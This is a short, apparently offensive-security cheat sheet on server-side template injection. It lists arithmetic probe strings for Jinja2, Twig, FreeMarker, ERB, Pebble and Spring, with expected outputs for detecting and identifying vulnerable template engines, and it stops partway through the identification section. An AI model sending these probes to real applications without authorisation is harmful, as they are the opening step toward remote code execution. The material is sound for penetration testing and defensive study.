# Server-Side Template Injection (SSTI)

> SSTI occurs when user input is embedded in a template and executed by the template engine, leading to RCE.

---

## 🔍 Detection - Universal Polyglot

```
{{7*7}}          -> 49  (Jinja2, Twig)
${7*7}           -> 49  (FreeMarker, Thymeleaf)
<%= 7*7 %>       -> 49  (ERB - Ruby)
#{7*7}           -> 49  (Pebble)
*{7*7}           -> 49  (Spring)
{{7*'7'}}        -> 7777777 (Jinja2)
                 -> 49 (Twig)
```

---

## 🗺️ Template Engine Identification

```
{{7*7}}     = 49  → likely Jinja2 or Twig
{{7*'7'}}   = 49  → Twig
